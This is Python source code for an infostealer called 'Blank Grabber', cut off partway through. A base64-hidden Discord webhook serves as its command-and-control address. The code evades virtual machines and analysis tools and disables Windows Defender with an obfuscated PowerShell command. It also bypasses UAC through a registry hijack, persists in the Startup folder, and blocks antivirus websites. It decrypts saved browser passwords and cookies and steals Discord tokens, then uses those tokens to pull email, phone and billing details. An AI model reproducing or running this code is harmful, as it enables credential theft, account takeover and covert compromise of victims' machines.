# pip install pyaesm urllib3

import base64
import os
import subprocess
import sys
import json
import pyaes
import random
import shutil
import sqlite3
import re
import traceback
import time
import ctypes
import logging
import zlib
from threading import Thread
from ctypes import wintypes
from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3
disable_warnings_urllib3()

class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyOTk5NDI3NzYzMTAzMzQwNC9yLU5lUVBoVGxsZ3JYQXdnM25CaklPZDdxa1JSNGdQNV9sYkpsNW5IbGpUdy1NM2Rud3huUDRjY3hJZ1JnX1Utdm8zdw==').decode())
    Mutex = base64.b64decode('Vk5aM1pRTzU3RGRlamRkUA==').decode()
    PingMe = bool('true')
    Vmprotect = bool('')
    Startup = bool('')
    Melt = bool('')
    UacBypass = bool('')
    ArchivePassword = base64.b64decode('QUs=').decode()
    HideConsole = bool('true')
    Debug = bool('')
    RunBoundOnStartup = bool('')
    CaptureWebcam = bool('true')
    CapturePasswords = bool('true')
    CaptureCookies = bool('true')
    CaptureAutofills = bool('true')
    CaptureHistory = bool('true')
    CaptureDiscordTokens = bool('true')
    CaptureGames = bool('true')
    CaptureWifiPasswords = bool('true')
    CaptureSystemInfo = bool('true')
    CaptureScreenshot = bool('true')
    CaptureTelegram = bool('true')
    CaptureCommonFiles = bool('true')
    CaptureWallets = bool('true')
    FakeError = (bool(''), ('', '', '0'))
    BlockAvSites = bool('')
    DiscordInjection = bool('true')
if not hasattr(sys, '_MEIPASS'):
    sys._MEIPASS = os.path.dirname(os.path.abspath(__file__))
ctypes.windll.kernel32.SetConsoleMode(ctypes.windll.kernel32.GetStdHandle(-11), 7)
logging.basicConfig(format='\x1b[1;36m%(funcName)s\x1b[0m:\x1b[1;33m%(levelname)7s\x1b[0m:%(message)s')
for _, logger in logging.root.manager.loggerDict.items():
    logger.disabled = True
Logger = logging.getLogger('Blank Grabber')
Logger.setLevel(logging.INFO)
if not Settings.Debug:
    Logger.disabled = True

class VmProtect:
    BLACKLISTED_UUIDS = ('7AB5C494-39F5-4941-9163-47F54D6D5016', '032E02B4-0499-05C3-0806-3C0700080009', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FE822042-A70C-D08B-F1D1-C207055A488F', '76122042-C286-FA81-F0A8-514CC507B250', '481E2042-A1AF-D390-CE06-A8F783B1E76A', 'F3988356-32F5-4AE1-8D47-FD3B8BAFBD4C', '9961A120-E691-4FFE-B67B-F0E4115D5919')
    BLACKLISTED_COMPUTERNAMES = ('bee7370c-8c0c-4', 'desktop-nakffmt', 'win-5e07cos9alr', 'b30f0242-1c6a-4', 'desktop-vrsqlag', 'q9iatrkprh', 'xc64zb', 'desktop-d019gdm', 'desktop-wi8clet', 'server1', 'lisa-pc', 'john-pc', 'desktop-b0t93d6', 'desktop-1pykp29', 'desktop-1y2433r', 'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc', 'desktop-wg3myjs', 'desktop-7xc6gez', 'desktop-5ov9s0o', 'qarzhrdbpj', 'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh', 'compname_5076', 'desktop-vkeons4', 'NTT-EFF-2W11WSS')
    BLACKLISTED_USERS = ('wdagutilityaccount', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm')
    BLACKLISTED_TASKS = ('fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver', 'vmwareservice', 'vmwaretray', 'discordtokenprotector')

    @staticmethod
    def checkUUID() -> bool:
        Logger.info('Checking UUID')
        uuid = subprocess.run('wmic csproduct get uuid', shell=True, capture_output=True).stdout.splitlines()[2].decode(errors='ignore').strip()
        return uuid in VmProtect.BLACKLISTED_UUIDS

    @staticmethod
    def checkComputerName() -> bool:
        Logger.info('Checking computer name')
        computername = os.getenv('computername')
        return computername.lower() in VmProtect.BLACKLISTED_COMPUTERNAMES

    @staticmethod
    def checkUsers() -> bool:
        Logger.info('Checking username')
        user = os.getlogin()
        return user.lower() in VmProtect.BLACKLISTED_USERS

    @staticmethod
    def checkHosting() -> bool:
        Logger.info('Checking if system is hosted online')
        http = PoolManager(cert_reqs='CERT_NONE')
        try:
            return http.request('GET', 'http://ip-api.com/line/?fields=hosting').data.decode(errors='ignore').strip() == 'true'
        except Exception:
            Logger.info('Unable to check if system is hosted online')
            return False

    @staticmethod
    def checkHTTPSimulation() -> bool:
        Logger.info('Checking if system is simulating connection')
        http = PoolManager(cert_reqs='CERT_NONE', timeout=1.0)
        try:
            http.request('GET', f'https://blank-{Utility.GetRandomString()}.in')
        except Exception:
            return False
        else:
            return True

    @staticmethod
    def checkRegistry() -> bool:
        Logger.info('Checking registry')
        r1 = subprocess.run('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2', capture_output=True, shell=True)
        r2 = subprocess.run('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2', capture_output=True, shell=True)
        gpucheck = any((x.lower() in subprocess.run('wmic path win32_VideoController get name', capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip().lower() for x in ('virtualbox', 'vmware')))
        dircheck = any([os.path.isdir(path) for path in ('D:\\Tools', 'D:\\OS2', 'D:\\NT3X')])
        return r1.returncode != 1 and r2.returncode != 1 or gpucheck or dircheck

    @staticmethod
    def killTasks() -> None:
        Utility.TaskKill(*VmProtect.BLACKLISTED_TASKS)

    @staticmethod
    def isVM() -> bool:
        Logger.info('Checking if system is a VM')
        Thread(target=VmProtect.killTasks, daemon=True).start()
        result = VmProtect.checkHTTPSimulation() or VmProtect.checkUUID() or VmProtect.checkComputerName() or VmProtect.checkUsers() or VmProtect.checkHosting() or VmProtect.checkRegistry()
        if result:
            Logger.info('System is a VM')
        else:
            Logger.info('System is not a VM')
        return result

class Errors:
    errors: list[str] = []

    @staticmethod
    def Catch(func):

        def newFunc(*args, **kwargs):
            try:
                return func(*args, **kwargs)
            except Exception as e:
                if isinstance(e, KeyboardInterrupt):
                    os._exit(1)
                if not isinstance(e, UnicodeEncodeError):
                    trb = traceback.format_exc()
                    Errors.errors.append(trb)
                    if Utility.GetSelf()[1]:
                        Logger.error(trb)
        return newFunc

class Tasks:
    threads: list[Thread] = list()

    @staticmethod
    def AddTask(task: Thread) -> None:
        Tasks.threads.append(task)

    @staticmethod
    def WaitForAll() -> None:
        for thread in Tasks.threads:
            thread.join()

class Syscalls:

    @staticmethod
    def CaptureWebcam(index: int, filePath: str) -> bool:
        avicap32 = ctypes.windll.avicap32
        WS_CHILD = 1073741824
        WM_CAP_DRIVER_CONNECT = 1024 + 10
        WM_CAP_DRIVER_DISCONNECT = 1026
        WM_CAP_FILE_SAVEDIB = 1024 + 100 + 25
        hcam = avicap32.capCreateCaptureWindowW(wintypes.LPWSTR('Blank'), WS_CHILD, 0, 0, 0, 0, ctypes.windll.user32.GetDesktopWindow(), 0)
        result = False
        if hcam:
            if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_DRIVER_CONNECT, index, 0):
                if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_FILE_SAVEDIB, 0, wintypes.LPWSTR(filePath)):
                    result = True
                ctypes.windll.user32.SendMessageA(hcam, WM_CAP_DRIVER_DISCONNECT, 0, 0)
            ctypes.windll.user32.DestroyWindow(hcam)
        return result

    @staticmethod
    def CreateMutex(mutex: str) -> bool:
        kernel32 = ctypes.windll.kernel32
        mutex = kernel32.CreateMutexA(None, False, mutex)
        return kernel32.GetLastError() != 183

    @staticmethod
    def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str=None) -> bytes:

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [('cbData', ctypes.c_ulong), ('pbData', ctypes.POINTER(ctypes.c_ubyte))]
        pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
        pDataOut = DATA_BLOB()
        pOptionalEntropy = None
        if optional_entropy is not None:
            optional_entropy = optional_entropy.encode('utf-16')
            pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))
        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy is not None else None, None, None, 0, ctypes.byref(pDataOut)):
            data = (ctypes.c_ubyte * pDataOut.cbData)()
            ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
            ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
            return bytes(data)
        raise ValueError('Invalid encrypted_data provided!')

    @staticmethod
    def HideConsole() -> None:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

class Utility:

    @staticmethod
    def GetSelf() -> tuple[str, bool]:
        if hasattr(sys, 'frozen'):
            return (sys.executable, True)
        else:
            return (__file__, False)

    @staticmethod
    def TaskKill(*tasks: str) -> None:
        tasks = list(map(lambda x: x.lower(), tasks))
        out = subprocess.run('tasklist /FO LIST', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().split('\r\n\r\n')
        for i in out:
            i = i.split('\r\n')[:2]
            try:
                name, pid = (i[0].split()[-1], int(i[1].split()[-1]))
                name = name[:-4] if name.endswith('.exe') else name
                if name.lower() in tasks:
                    subprocess.run('taskkill /F /PID %d' % pid, shell=True, capture_output=True)
            except Exception:
                pass

    @staticmethod
    def UACPrompt(path: str) -> bool:
        return ctypes.windll.shell32.ShellExecuteW(None, 'runas', path, ' '.join(sys.argv), None, 1) == 42

    @staticmethod
    def DisableDefender() -> None:
        command = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDIgJiAiJVByb2dyYW1GaWxlcyVcV2luZG93cyBEZWZlbmRlclxNcENtZFJ1bi5leGUiIC1SZW1vdmVEZWZpbml0aW9ucyAtQWxs').decode(errors='ignore')
        subprocess.Popen(command, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

    @staticmethod
    def ExcludeFromDefender(path: str=None) -> None:
        if path is None:
            path = Utility.GetSelf()[0]
        subprocess.Popen("powershell -Command Add-MpPreference -ExclusionPath '{}'".format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

    @staticmethod
    def GetRandomString(length: int=5, invisible: bool=False):
        if invisible:
            return ''.join(random.choices(['\xa0', chr(8239)] + [chr(x) for x in range(8192, 8208)], k=length))
        else:
            return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=length))

    @staticmethod
    def GetWifiPasswords() -> dict:
        profiles = list()
        passwords = dict()
        for line in subprocess.run('netsh wlan show profile', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
            if 'All User Profile' in line:
                name = line[line.find(':') + 1:].strip()
                profiles.append(name)
        for profile in profiles:
            found = False
            for line in subprocess.run(f'netsh wlan show profile "{profile}" key=clear', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
                if 'Key Content' in line:
                    passwords[profile] = line[line.find(':') + 1:].strip()
                    found = True
                    break
            if not found:
                passwords[profile] = '(None)'
        return passwords

    @staticmethod
    def GetLnkTarget(path_to_lnk: str) -> str | None:
        target = None
        if os.path.isfile(path_to_lnk):
            output = subprocess.run('wmic path win32_shortcutfile where name="%s" get target /value' % os.path.abspath(path_to_lnk).replace('\\', '\\\\'), shell=True, capture_output=True).stdout.decode()
            if output:
                for line in output.splitlines():
                    if line.startswith('Target='):
                        temp = line.lstrip('Target=').strip()
                        if os.path.exists(temp):
                            target = temp
                            break
        return target

    @staticmethod
    def GetLnkFromStartMenu(app: str) -> list[str]:
        shortcutPaths = []
        startMenuPaths = [os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs'), os.path.join('C:\\', 'ProgramData', 'Microsoft', 'Windows', 'Start Menu', 'Programs')]
        for startMenuPath in startMenuPaths:
            for root, _, files in os.walk(startMenuPath):
                for file in files:
                    if file.lower() == '%s.lnk' % app.lower():
                        shortcutPaths.append(os.path.join(root, file))
        return shortcutPaths

    @staticmethod
    def IsAdmin() -> bool:
        return ctypes.windll.shell32.IsUserAnAdmin() == 1

    @staticmethod
    def UACbypass(method: int=1) -> bool:
        if Utility.GetSelf()[1]:
            execute = lambda cmd: subprocess.run(cmd, shell=True, capture_output=True)
            match method:
                case 1:
                    execute(f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{sys.executable}" /f')
                    execute('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f')
                    log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                    execute('computerdefaults --nouacbypass')
                    log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                    execute('reg delete hkcu\\Software\\Classes\\ms-settings /f')
                    if log_count_after > log_count_before:
                        return Utility.UACbypass(method + 1)
                case 2:
                    execute(f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{sys.executable}" /f')
                    execute('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f')
                    log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                    execute('fodhelper --nouacbypass')
                    log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
                    execute('reg delete hkcu\\Software\\Classes\\ms-settings /f')
                    if log_count_after > log_count_before:
                        return Utility.UACbypass(method + 1)
                case _:
                    return False
            return True

    @staticmethod
    def IsInStartup() -> bool:
        path = os.path.dirname(Utility.GetSelf()[0])
        return os.path.basename(path).lower() == 'startup'

    @staticmethod
    def PutInStartup() -> str:
        STARTUPDIR = 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp'
        file, isExecutable = Utility.GetSelf()
        if isExecutable:
            out = os.path.join(STARTUPDIR, '{}.scr'.format(Utility.GetRandomString(invisible=True)))
            os.makedirs(STARTUPDIR, exist_ok=True)
            try:
                shutil.copy(file, out)
            except Exception:
                return None
            return out

    @staticmethod
    def IsConnectedToInternet() -> bool:
        http = PoolManager(cert_reqs='CERT_NONE')
        try:
            return http.request('GET', 'https://gstatic.com/generate_204').status == 204
        except Exception:
            return False

    @staticmethod
    def DeleteSelf():
        path, isExecutable = Utility.GetSelf()
        if isExecutable:
            subprocess.Popen('ping localhost -n 3 > NUL && del /A H /F "{}"'.format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
            os._exit(0)
        else:
            os.remove(path)

    @staticmethod
    def HideSelf() -> None:
        path, _ = Utility.GetSelf()
        subprocess.Popen('attrib +h +s "{}"'.format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

    @staticmethod
    def BlockSites() -> None:
        if Utility.IsAdmin():
            call = subprocess.run('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /V DataBasePath', shell=True, capture_output=True)
            if call.returncode != 0:
                hostdirpath = os.path.join('System32', 'drivers', 'etc')
            else:
                hostdirpath = os.sep.join(call.stdout.decode(errors='ignore').strip().splitlines()[-1].split()[-1].split(os.sep)[1:])
            hostfilepath = os.path.join(os.getenv('systemroot'), hostdirpath, 'hosts')
            if not os.path.isfile(hostfilepath):
                return
            with open(hostfilepath) as file:
                data = file.readlines()
            BANNED_SITES = ('virustotal.com', 'avast.com', 'totalav.com', 'scanguard.com', 'totaladblock.com', 'pcprotect.com', 'mcafee.com', 'bitdefender.com', 'us.norton.com', 'avg.com', 'malwarebytes.com', 'pandasecurity.com', 'avira.com', 'norton.com', 'eset.com', 'zillya.com', 'kaspersky.com', 'usa.kaspersky.com', 'sophos.com', 'home.sophos.com', 'adaware.com', 'bullguard.com', 'clamav.net', 'drweb.com', 'emsisoft.com', 'f-secure.com', 'zonealarm.com', 'trendmicro.com', 'ccleaner.com')
            newdata = []
            for i in data:
                if any([x in i for x in BANNED_SITES]):
                    continue
                else:
                    newdata.append(i)
            for i in BANNED_SITES:
                newdata.append('\t0.0.0.0 {}'.format(i))
                newdata.append('\t0.0.0.0 www.{}'.format(i))
            newdata = '\n'.join(newdata).replace('\n\n', '\n')
            subprocess.run('attrib -r {}'.format(hostfilepath), shell=True, capture_output=True)
            with open(hostfilepath, 'w') as file:
                file.write(newdata)
            subprocess.run('attrib +r {}'.format(hostfilepath), shell=True, capture_output=True)

class Browsers:

    class Chromium:
        BrowserPath: str = None
        EncryptionKey: bytes = None

        def __init__(self, browserPath: str) -> None:
            if not os.path.isdir(browserPath):
                raise NotADirectoryError('Browser path not found!')
            self.BrowserPath = browserPath

        def GetEncryptionKey(self) -> bytes | None:
            if self.EncryptionKey is not None:
                return self.EncryptionKey
            else:
                localStatePath = os.path.join(self.BrowserPath, 'Local State')
                if os.path.isfile(localStatePath):
                    with open(localStatePath, encoding='utf-8', errors='ignore') as file:
                        jsonContent: dict = json.load(file)
                    encryptedKey: str = jsonContent['os_crypt']['encrypted_key']
                    encryptedKey = base64.b64decode(encryptedKey.encode())[5:]
                    self.EncryptionKey = Syscalls.CryptUnprotectData(encryptedKey)
                    return self.EncryptionKey
                else:
                    return None

        def Decrypt(self, buffer: bytes, key: bytes) -> str:
            version = buffer.decode(errors='ignore')
            if version.startswith(('v10', 'v11')):
                iv = buffer[3:15]
                cipherText = buffer[15:]
                return pyaes.AESModeOfOperationGCM(key, iv).decrypt(cipherText)[:-16].decode(errors='ignore')
            else:
                return str(Syscalls.CryptUnprotectData(buffer))

        def GetPasswords(self) -> list[tuple[str, str, str]]:
            encryptionKey = self.GetEncryptionKey()
            passwords = list()
            if encryptionKey is None:
                return passwords
            loginFilePaths = list()
            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'login data':
                        filepath = os.path.join(root, file)
                        loginFilePaths.append(filepath)
            for path in loginFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                    if not os.path.isfile(tempfile):
                        break
                try:
                    shutil.copy(path, tempfile)
                except Exception:
                    continue
                db = sqlite3.connect(tempfile)
                db.text_factory = lambda b: b.decode(errors='ignore')
                cursor = db.cursor()
                try:
                    results = cursor.execute('SELECT origin_url, username_value, password_value FROM logins').fetchall()
                    for url, username, password in results:
                        password = self.Decrypt(password, encryptionKey)
                        if url and username and password:
                            passwords.append((url, username, password))
                except Exception:
                    pass
                cursor.close()
                db.close()
                os.remove(tempfile)
            return passwords

        def GetCookies(self) -> list[tuple[str, str, str, str, int]]:
            encryptionKey = self.GetEncryptionKey()
            cookies = list()
            if encryptionKey is None:
                return cookies
            cookiesFilePaths = list()
            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'cookies':
                        filepath = os.path.join(root, file)
                        cookiesFilePaths.append(filepath)
            for path in cookiesFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                    if not os.path.isfile(tempfile):
                        break
                try:
                    shutil.copy(path, tempfile)
                except Exception:
                    continue
                db = sqlite3.connect(tempfile)
                db.text_factory = lambda b: b.decode(errors='ignore')
                cursor = db.cursor()
                try:
                    results = cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies').fetchall()
                    for host, name, path, cookie, expiry in results:
                        cookie = self.Decrypt(cookie, encryptionKey)
                        if host and name and cookie:
                            cookies.append((host, name, path, cookie, expiry))
                except Exception:
                    pass
                cursor.close()
                db.close()
                os.remove(tempfile)
            return cookies

        def GetHistory(self) -> list[tuple[str, str, int]]:
            history = list()
            historyFilePaths = list()
            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'history':
                        filepath = os.path.join(root, file)
                        historyFilePaths.append(filepath)
            for path in historyFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                    if not os.path.isfile(tempfile):
                        break
                try:
                    shutil.copy(path, tempfile)
                except Exception:
                    continue
                db = sqlite3.connect(tempfile)
                db.text_factory = lambda b: b.decode(errors='ignore')
                cursor = db.cursor()
                try:
                    results = cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls').fetchall()
                    for url, title, vc, lvt in results:
                        if url and title and (vc is not None) and (lvt is not None):
                            history.append((url, title, vc, lvt))
                except Exception:
                    pass
                cursor.close()
                db.close()
                os.remove(tempfile)
            history.sort(key=lambda x: x[3], reverse=True)
            return list([(x[0], x[1], x[2]) for x in history])

        def GetAutofills(self) -> list[str]:
            autofills = list()
            autofillsFilePaths = list()
            for root, _, files in os.walk(self.BrowserPath):
                for file in files:
                    if file.lower() == 'web data':
                        filepath = os.path.join(root, file)
                        autofillsFilePaths.append(filepath)
            for path in autofillsFilePaths:
                while True:
                    tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
                    if not os.path.isfile(tempfile):
                        break
                try:
                    shutil.copy(path, tempfile)
                except Exception:
                    continue
                db = sqlite3.connect(tempfile)
                db.text_factory = lambda b: b.decode(errors='ignore')
                cursor = db.cursor()
                try:
                    results: list[str] = [x[0] for x in cursor.execute('SELECT value FROM autofill').fetchall()]
                    for data in results:
                        data = data.strip()
                        if data and (not data in autofills):
                            autofills.append(data)
                except Exception:
                    pass
                cursor.close()
                db.close()
                os.remove(tempfile)
            return autofills

class Discord:
    httpClient = PoolManager(cert_reqs='CERT_NONE')
    ROAMING = os.getenv('appdata')
    LOCALAPPDATA = os.getenv('localappdata')
    REGEX = '[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{25,110}'
    REGEX_ENC = 'dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*'

    @staticmethod
    def GetHeaders(token: str=None) -> dict:
        headers = {'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4593.122 Safari/537.36'}
        if token:
            headers['authorization'] = token
        return headers

    @staticmethod
    def GetTokens() -> list[dict]:
        results: list[dict] = list()
        tokens: list[str] = list()
        threads: list[Thread] = list()
        paths = {'Discord': os.path.join(Discord.ROAMING, 'discord'), 'Discord Canary': os.path.join(Discord.ROAMING, 'discordcanary'), 'Lightcord': os.path.join(Discord.ROAMING, 'Lightcord'), 'Discord PTB': os.path.join(Discord.ROAMING, 'discordptb'), 'Opera': os.path.join(Discord.ROAMING, 'Opera Software', 'Opera Stable'), 'Opera GX': os.path.join(Discord.ROAMING, 'Opera Software', 'Opera GX Stable'), 'Amigo': os.path.join(Discord.LOCALAPPDATA, 'Amigo', 'User Data'), 'Torch': os.path.join(Discord.LOCALAPPDATA, 'Torch', 'User Data'), 'Kometa': os.path.join(Discord.LOCALAPPDATA, 'Kometa', 'User Data'), 'Orbitum': os.path.join(Discord.LOCALAPPDATA, 'Orbitum', 'User Data'), 'CentBrowse': os.path.join(Discord.LOCALAPPDATA, 'CentBrowser', 'User Data'), '7Sta': os.path.join(Discord.LOCALAPPDATA, '7Star', '7Star', 'User Data'), 'Sputnik': os.path.join(Discord.LOCALAPPDATA, 'Sputnik', 'Sputnik', 'User Data'), 'Vivaldi': os.path.join(Discord.LOCALAPPDATA, 'Vivaldi', 'User Data'), 'Chrome SxS': os.path.join(Discord.LOCALAPPDATA, 'Google', 'Chrome SxS', 'User Data'), 'Chrome': os.path.join(Discord.LOCALAPPDATA, 'Google', 'Chrome', 'User Data'), 'FireFox': os.path.join(Discord.ROAMING, 'Mozilla', 'Firefox', 'Profiles'), 'Epic Privacy Browse': os.path.join(Discord.LOCALAPPDATA, 'Epic Privacy Browser', 'User Data'), 'Microsoft Edge': os.path.join(Discord.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data'), 'Uran': os.path.join(Discord.LOCALAPPDATA, 'uCozMedia', 'Uran', 'User Data'), 'Yandex': os.path.join(Discord.LOCALAPPDATA, 'Yandex', 'YandexBrowser', 'User Data'), 'Brave': os.path.join(Discord.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data'), 'Iridium': os.path.join(Discord.LOCALAPPDATA, 'Iridium', 'User Data')}
        for name, path in paths.items():
            if os.path.isdir(path):
                if name == 'FireFox':
                    t = Thread(target=lambda: tokens.extend(Discord.FireFoxSteal(path) or list()))
                    t.start()
                    threads.append(t)
                else:
                    t = Thread(target=lambda: tokens.extend(Discord.SafeStorageSteal(path) or list()))
                    t.start()
                    threads.append(t)
                    t = Thread(target=lambda: tokens.extend(Discord.SimpleSteal(path) or list()))
                    t.start()
                    threads.append(t)
        for thread in threads:
            thread.join()
        tokens = [*set(tokens)]
        for token in tokens:
            r: HTTPResponse = Discord.httpClient.request('GET', 'https://discord.com/api/v9/users/@me', headers=Discord.GetHeaders(token.strip()))
            if r.status == 200:
                r = r.data.decode(errors='ignore')
                r = json.loads(r)
                user = r['username'] + '#' + str(r['discriminator'])
                id = r['id']
                email = r['email'].strip() if r['email'] else '(No Email)'
                phone = r['phone'] if r['phone'] else '(No Phone Number)'
                verified = r['verified']
                mfa = r['mfa_enabled']
                nitro_type = r.get('premium_type', 0)
                nitro_infos = {0: 'No Nitro', 1: 'Nitro Classic', 2: 'Nitro', 3: 'Nitro Basic'}
                nitro_data = nitro_infos.get(nitro_type, '(Unknown)')
                billing = json.loads(Discord.httpClient.request('GET', 'https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=Discord.GetHeaders(token)).data.decode(errors='ignore'))
                if len(billing) == 0:
                    billing = '(No Payment Method)'
                else:
                    methods = {'Card': 0, 'Paypal': 0, 'Unknown': 0}
                    for m in billing:
                        if not isinstance(m, dict):
                            continue
                        method_type = m.get('type', 0)
                        match method_type:
                            case 1:
                                methods['Card'] += 1
                            case 2:
                                methods['Paypal'] += 1
                            case _:
                                methods['Unknown'] += 1
                    billing = ', '.join(['{} ({})'.format(name, quantity) for name, quantity in methods.items() if quantity != 0]) or 'None'
                gifts = list()
                r = Discord.httpClient.request('GET', 'https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers=Discord.GetHeaders(token)).data.decode(errors='ignore')
                if 'code' in r:
                    r = json.loads(r)
                    for i in r:
                        if isinstance(i, dict):
                            code = i.get('code')
                            if i.get('promotion') is None or not isinstance(i['promotion'], dict):
                                continue
                            title = i['promotion'].get('outbound_title')
                            if code and title:
                                gifts.append(f'{title}: {code}')
                if len(gifts) == 0:
